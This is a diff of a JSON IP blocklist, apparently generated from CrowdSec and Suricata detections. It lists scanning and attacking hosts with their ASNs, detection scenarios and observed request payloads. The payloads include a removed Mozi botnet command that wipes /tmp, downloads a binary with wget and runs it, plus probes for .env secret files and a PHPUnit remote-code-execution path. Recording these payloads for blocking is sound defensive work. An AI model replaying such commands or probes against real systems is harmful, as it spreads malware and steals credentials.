@@ -1,132 +1,13 @@
 {
-  "generated_at": "2026-11-04T01:00:00Z",
+  "generated_at": "2026-11-04T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 98,
-    "v4": 98,
+    "total": 101,
+    "v4": 101,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "66.132.186.168",
-      "family": "v4",
-      "first_seen": "2026-10-28T09:00:00Z",
-      "last_seen": "2026-10-28T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398324",
-      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
-      "asn_prefix": "66.132.186.0/24",
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "216.180.246.248",
-      "family": "v4",
-      "first_seen": "2026-10-28T05:00:00Z",
-      "last_seen": "2026-10-28T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "216.180.246.0/24",
-      "payloads": [
-        "GET /admin/index.html",
-        "GET /+CSCOE+/logon.html",
-        "GET /remote/login",
-        "GET /",
-        "GET /manage/account/login",
-        "GET /index.html",
-        "GET /cgi-bin/login.cgi",
-        "GET /login.htm",
-        "GET /login.html",
-        "GET /login.jsp",
-        "GET /login",
-        "GET /doc/index.html"
-      ]
-    },
-    {
-      "ip": "184.105.139.68",
-      "family": "v4",
-      "first_seen": "2026-10-28T03:00:00Z",
-      "last_seen": "2026-10-28T03:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "6939",
-      "asn_name": "HURRICANE - Hurricane Electric LLC",
-      "asn_prefix": "184.104.0.0/15",
-      "payloads": [
-        "GET /remote/logincheck"
-      ]
-    },
-    {
-      "ip": "153.117.9.89",
-      "family": "v4",
-      "first_seen": "2026-10-28T06:00:00Z",
-      "last_seen": "2026-10-28T06:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "153.117.9.0/24",
-      "payloads": [
-        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://153.117.9.89:33418/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
-      ]
-    },
-    {
-      "ip": "43.135.25.158",
-      "family": "v4",
-      "first_seen": "2026-10-28T02:00:00Z",
-      "last_seen": "2026-10-28T02:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.135.0.0/18",
-      "payloads": [
-        "POST /applyapp.cgi"
-      ]
-    },
-    {
-      "ip": "45.156.87.50",
-      "family": "v4",
-      "first_seen": "2026-10-28T06:00:00Z",
-      "last_seen": "2026-10-28T06:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "197170",
-      "asn_name": "TECHTIES-AS TechTies Inc.",
-      "asn_prefix": "45.156.87.0/24"
-    },
     {
       "ip": "66.132.186.188",
       "family": "v4",
@@ -2053,7 +1934,7 @@
       "ip": "20.164.214.25",
       "family": "v4",
       "first_seen": "2026-11-03T11:00:00Z",
-      "last_seen": "2026-11-03T11:00:00Z",
+      "last_seen": "2026-11-04T05:00:00Z",
       "scenarios": [
         "crowdsec/http-probing",
         "crowdsec/http-wordpress-scan"
@@ -2276,6 +2157,203 @@
       "asn_prefix": "167.99.80.0/20",
       "payloads": [
         "GET /"
+      ]
+    },
+    {
+      "ip": "34.182.245.101",
+      "family": "v4",
+      "first_seen": "2026-11-04T12:00:00Z",
+      "last_seen": "2026-11-04T12:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.182.128.0/17",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /api/config",
+        "GET /.next/prerender-manifest.json",
+        "GET /.output/nitro.json",
+        "GET /.env.config",
+        "GET /.env.production.local",
+        "GET /.env.development.local",
+        "GET /.env.development",
+        "GET /.bashrc",
+        "GET /",
+        "GET /robots.txt",
+        "GET /sitemap.xml",
+        "GET /sitemap_index.xml",
+        "GET /2ct4is5iynuw6q7rjwvu",
+        "GET /cwsmzlty9cyj5yy5flqo",
+        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
+        "GET /.env.prod.local",
+        "GET /.firebaserc",
+        "GET /.env.keys",
+        "GET /.env.dev.local",
+        "POST /graphql"
+      ]
+    },
+    {
+      "ip": "172.180.64.72",
+      "family": "v4",
+      "first_seen": "2026-11-04T11:00:00Z",
+      "last_seen": "2026-11-04T11:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/x.js"
+      ]
+    },
+    {
+      "ip": "50.116.39.84",
+      "family": "v4",
+      "first_seen": "2026-11-04T07:00:00Z",
+      "last_seen": "2026-11-04T08:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "HEAD /blog/wp-login.php",
+        "HEAD /wp-login.php",
+        "HEAD /admin/wp-login.php",
+        "HEAD /wordpress/wp-login.php",
+        "HEAD /wp/wp-login.php",
+        "HEAD /cms/wp-login.php"
+      ]
+    },
+    {
+      "ip": "66.132.195.208",
+      "family": "v4",
+      "first_seen": "2026-11-04T06:00:00Z",
+      "last_seen": "2026-11-04T06:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "35.206.133.147",
+      "family": "v4",
+      "first_seen": "2026-11-04T06:00:00Z",
+      "last_seen": "2026-11-04T06:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 13"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.206.128.0/18",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "85.217.140.20",
+      "family": "v4",
+      "first_seen": "2026-11-04T04:00:00Z",
+      "last_seen": "2026-11-04T04:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "209334",
+      "asn_name": "MODAT-01 Modat B.V.",
+      "asn_prefix": "85.217.140.0/24",
+      "tags": [
+        "mwl:scanner=\"modat\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "194.32.120.41",
+      "family": "v4",
+      "first_seen": "2026-11-04T04:00:00Z",
+      "last_seen": "2026-11-04T04:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP PHPUnit PHP remote code execution attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "199741",
+      "asn_name": "TRANSITX-BYOIP-Customers TransitX Ltd",
+      "asn_prefix": "194.32.120.0/24",
+      "payloads": [
+        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      ]
+    },
+    {
+      "ip": "20.29.52.146",
+      "family": "v4",
+      "first_seen": "2026-11-04T03:00:00Z",
+      "last_seen": "2026-11-04T03:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.0.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "40.119.45.252",
+      "family": "v4",
+      "first_seen": "2026-11-04T12:00:00Z",
+      "last_seen": "2026-11-04T12:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SSH invalid banner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
       ]
     }
   ]
